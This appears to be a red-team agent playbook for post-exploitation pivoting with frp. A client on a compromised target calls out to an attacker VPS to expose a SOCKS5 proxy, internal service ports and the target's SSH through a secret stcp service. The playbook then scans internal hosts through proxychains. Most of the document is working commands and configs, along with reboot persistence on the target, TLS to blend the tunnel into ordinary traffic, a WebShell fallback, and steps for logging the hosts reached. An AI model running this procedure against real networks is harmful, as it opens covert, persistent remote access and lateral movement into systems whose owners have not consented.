# FRP Tunnel: frps Server and frpc Client

Deploys the frp pair across the target boundary: `frps` as a long-lived relay on `VPS_IP` and `frpc` on the target, both from the same release archive. The client registers named proxies — a SOCKS5 endpoint, a single TCP port mapping, or a secret `stcp` service reachable only by a matching visitor — and the server exposes them on the VPS. Configuration is declarative, so a tunnel that must come back after a reboot is a config file plus a supervisor entry rather than a long command line. The record is a `tunnel` row with `kind=frp` and `entry_kind=target-outbound`.

## When to use

- A TCP relay must persist across reboots and reconnects, and the target side needs no interactive console.
- You want several mappings from one client: SOCKS5 plus a database port plus a management port, each named and independently logged.
- Traffic must be token-authenticated on both sides and only the visitor should reach the service (`stcp`), so the VPS port stays closed to everyone else.
- You need a clean split between "the port is open on the VPS" and "the tool that uses it", which frp gives through `remotePort` and `allowPorts`.
- Not for UDP-heavy or ICMP work; frp supports UDP proxies but scanners that need SYN and raw sockets belong to `ligolo-proxy`.
- Not for a network that allows only HTTP on 80/443 through a filtering proxy — frp speaks its own protocol on `bindPort`; use `chisel-tunnel` or `suo5-tunnel` there.

## Prerequisites

- Binaries: `bash $DSH_HOME/redteam/setup.sh --yes` unpacks both `$DSH_HOME/redteam/toolkit/frp/frps` and `$DSH_HOME/redteam/toolkit/frp/frpc` in one step. If it cannot fetch, download `frp_<version>_linux_amd64.tar.gz` from the project releases, extract, and place `frpc` and `frps` in that same directory with `chmod +x`.
- `VPS_IP` reachable on `bindPort`, and every `remotePort` you plan to use open in the cloud security group as well — frp binds them on the VPS, so the firewall must allow them too.
- A shared token. Generate it once and keep it out of shell history: `openssl rand -hex 16`.
- VPS identity from the environment, with defaults so nothing is required:

```bash
set -a; . "$DSH_HOME/.env" 2>/dev/null; set +a
VPS_IP="${VPS_IP:-$(printf '%s' "${REDTEAM_VPS_HOST#*@}")}"
```

  The Python equivalent for scripting is `os.environ.get("VPS_IP", "")`.
- Nothing here is mandatory and each step has a fallback. `bindPort` blocked → `chisel-tunnel` on 443. No token wanted → `auth.method = "none"`, which is acceptable only while `allowPorts` is narrow. `frpc` will not run on the target (missing libc, wrong arch) → use `suo5-tunnel` over the WebShell instead.

## Workflow

1. Server side, on `VPS_IP`: write `frps.toml` first, narrow the port range, then start the daemon inside `tmux`.

```bash
cat > RESULT_DIR/frps.toml <<'EOF'
bindPort = LISTEN_PORT
auth.method = "token"
auth.token = "FRP_TOKEN"
allowPorts = [{ start = 9000, end = 9999 }]
webServer.addr = "127.0.0.1"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "DASH_PASS"
EOF
$DSH_HOME/redteam/toolkit/frp/frps verify -c RESULT_DIR/frps.toml
tmux new -s frps
$DSH_HOME/redteam/toolkit/frp/frps -c RESULT_DIR/frps.toml 2>&1 | tee RESULT_DIR/frps-LISTEN_PORT.log
```

2. Confirm the control port and the dashboard are up.

```bash
ss -lntp | grep -E ':(LISTEN_PORT|7500)\b'
curl -s -u admin:DASH_PASS http://127.0.0.1:7500/api/serverinfo | head -c 300
```

3. Target side: write `frpc.toml` with the token and one SOCKS5 proxy, then validate before running so a typo costs one command instead of a silent failure.

```toml
serverAddr = "VPS_IP"
serverPort = LISTEN_PORT
auth.method = "token"
auth.token = "FRP_TOKEN"

[[proxies]]
name = "socks-main"
type = "tcp"
remotePort = PORT
[proxies.plugin]
type = "socks5"
```

```bash
$DSH_HOME/redteam/toolkit/frp/frpc verify -c frpc.toml
```

4. Run it in the background and prove the login on both sides.

```bash
nohup $DSH_HOME/redteam/toolkit/frp/frpc -c frpc.toml >>RESULT_DIR/frpc-TARGET_IP.log 2>&1 &
sleep 3; tail -5 RESULT_DIR/frpc-TARGET_IP.log
ss -lntp | grep ":PORT\b"        # on VPS_IP
```

   The client log line `start proxy success` and the server line `proxy added: [socks-main]` together are the join evidence.

5. Add a single port mapping instead of a SOCKS endpoint when one service is the whole goal — fewer open ports, sharper evidence.

```toml
[[proxies]]
name = "mssql-1433"
type = "tcp"
localIP = "127.0.0.1"
localPort = LPORT
remotePort = PORT
```

6. Add a secret service reachable only by a visitor, so `remotePort` stays closed to the internet.

```toml
# on the target, in frpc.toml
[[proxies]]
name = "ssh-secret"
type = "stcp"
localIP = "127.0.0.1"
localPort = 22
secretKey = "STCP_KEY"
```

```toml
# on the VPS, in a second frpc instance acting as the visitor
serverAddr = "127.0.0.1"
serverPort = LISTEN_PORT
auth.method = "token"
auth.token = "FRP_TOKEN"

[[visitors]]
name = "ssh-secret-visitor"
type = "stcp"
serverName = "ssh-secret"
secretKey = "STCP_KEY"
bindAddr = "127.0.0.1"
bindPort = LPORT
```

7. Use the resulting port. Keep every consumer pointed at the VPS side and never touch the system proxy.

```bash
curl -s --max-time 8 --socks5-hostname VPS_IP:PORT http://TARGET_IP:PORT/ | head -20
cat > RESULT_DIR/proxychains-PORT.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 VPS_IP PORT
EOF
proxychains4 -f RESULT_DIR/proxychains-PORT.conf nmap -sT -Pn -p PORT TARGET_IP
```

8. Make it survive a reboot only when the task calls for it: `systemd` unit on the VPS, and on the target a scheduled task or an init script the host already uses. Keep the config in `RESULT_DIR` so removal is a single file deletion.

## Output and evidence

- `RESULT_DIR/frps.toml`, `RESULT_DIR/frpc-TARGET_IP.toml` — the exact configs; the token may be redacted in the copy that leaves the machine.
- `RESULT_DIR/frps-LISTEN_PORT.log`, `RESULT_DIR/frpc-TARGET_IP.log` — login, proxy registration, reconnect and error lines.
- `RESULT_DIR/proxychains-PORT.conf` — profile for every internal command that follows.
- `redteam_tunnel_add` with `kind=frp`, `listen=VPS_IP:PORT` (the port you consume), `entry` = the `frpc` config path plus start command, `reach` = the CIDR you tested, `entry_kind=target-outbound`.
- `redteam_evidence_record` with `operation=frp_tunnel_up`, `authority=tool-output`, `confidence=observed`, and both join lines in `result`.
- `redteam_asset_add` each internal host reached through the mapping, `provenance=active`, `tool=frp`.
- `redteam_attack_file_add` a working `frpc` config as `kind=script` once it demonstrably registered, with `evidence` naming the `start proxy success` line.
- `redteam_session_check` before reuse; a frp row that no longer answers is marked offline there rather than by hand.

## Failure modes

- `login to server failed: authorization failed` → token mismatch, or the client is old enough that it still reads `[common] token` in INI form → copy the token verbatim, and for pre-0.52 builds use `frpc.ini` with `[common]` sections instead of TOML.
- `start error: port already used` → `remotePort` is bound by another process on the VPS → `ss -lntp | grep PORT` and pick a free port, or stop the stale `frpc`.
- `connect to local service error: dial tcp 127.0.0.1:LPORT: connect: connection refused` → `localPort` is wrong or the service listens on another interface → check with `ss -lntp` on the target and use the address the service actually binds.
- `port not allowed` → `remotePort` falls outside `allowPorts` → widen the range deliberately or choose a port inside it.
- `i/o deadline reached` in the client log → the control connection is being dropped by an intermediary, or `bindPort` is filtered → verify with `nc -vz VPS_IP LISTEN_PORT`, and consider `transport.tls.enable = true` plus a different port.
- `toml: line N: expected ...` from `verify` → config syntax, usually a missing `[[proxies]]` header or an unquoted value → fix on the local copy and re-run `verify` before touching the target.
- Dashboard reachable, mappings absent → `frpc` never connected; the client log is authoritative, not the dashboard.
- SOCKS works for a while then stalls → the server side has a stale session from an old client pid → restart `frps`, which drops both sides cleanly, then restart the client.

## Notes

- One `frpc` per target host, one `frps` per VPS. Two clients with the same proxy name collide server-side with `proxy already exists`.
- Rate: a SOCKS5 proxy registered by frp serializes through one TCP stream per connection but adds a hop; keep `THREADS` and `RATE` conservative and expect `nmap -sT` to be the practical scanning mode.
- Opsec: `allowPorts` should cover only the ports in use, the dashboard must stay on `127.0.0.1`, and the token must never appear in a report. `transport.tls.enable = true` makes the control channel indistinguishable from generic TLS to a passive observer.
- Idempotency: `frpc verify` first, then start once. Re-running the start command with a live pid produces the port-in-use failure above rather than a second tunnel.
- Resume: both halves reconnect automatically with the same config; a VPS reboot needs the `frps` process (or unit) restarted, after which clients re-register within their retry interval.
- Cleanup: kill `frpc` on the target, kill `frps` on the VPS, close the opened `remotePort` entries in the security group, delete the configs and tokens from `RESULT_DIR` if they are no longer needed, and `redteam_tunnel_update` with `id` and `status=down`.
